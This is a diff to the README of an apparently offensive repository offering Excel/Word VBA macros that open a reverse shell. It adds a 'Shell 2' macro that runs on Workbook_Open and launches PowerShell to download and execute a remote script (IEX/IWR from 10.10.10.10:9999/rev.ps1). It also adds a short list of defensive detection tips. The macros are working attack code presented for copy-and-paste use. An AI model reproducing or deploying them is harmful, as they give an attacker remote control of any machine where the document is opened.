@@ -1,7 +1,7 @@
 # Excel-Reverse-Shell-VBA-
 Simple VBA to execute Windows API and open a remote shell 
 
-# Code
+# Code (Shell 1)
 Copy & paste into blank macro
 ```
 Const ip = "192.168.50.2"   //Replace IP
@@ -173,5 +173,31 @@ Private Sub Document_Open()
 End Sub
 
 ```
-# Defensive Tactics
+# Code (Shell 2)
+
+```
+Private Sub Workbook_Open()
+    Dim author As String
+    author = ActiveWorkbook.BuiltinDocumentProperties("Author")
+    
+    Dim ws As Object
+    Set ws = CreateObject("WScript.Shell")
+    
+    With ws.Exec("powershell 'IEX( IWR http://10.10.10.10:9999/rev.ps1 -UseBasicParsing)'")     //Replace IP/Port/File
+        .StdIn.WriteLine author
+        .StdIn.WriteBlankLines 1
+        .Terminate
+    End With
+End Sub
+
+```
+
+# Defensive Tactics (Prevention & Detection)
+
+- Use a secure and enforced email security product that is configured with an offensive mindset
+- Re-Enforce any EDR solution to look for suspicious macros and script obfuscation
+- Use any EDR solution to look for cmd.exe or powershell.exe subprocesses under Office 365 products and create a specific detection rule the notify the Cyber operation team
+- Monitor for any Office 365 product that does any external call to a remote web server
+- Configure detection rules for automatic contianment , isolation and erdacition for effective incident response
+- Conduct regular breach simulations to test the policy effectiveness of the EDR & email security solution
 
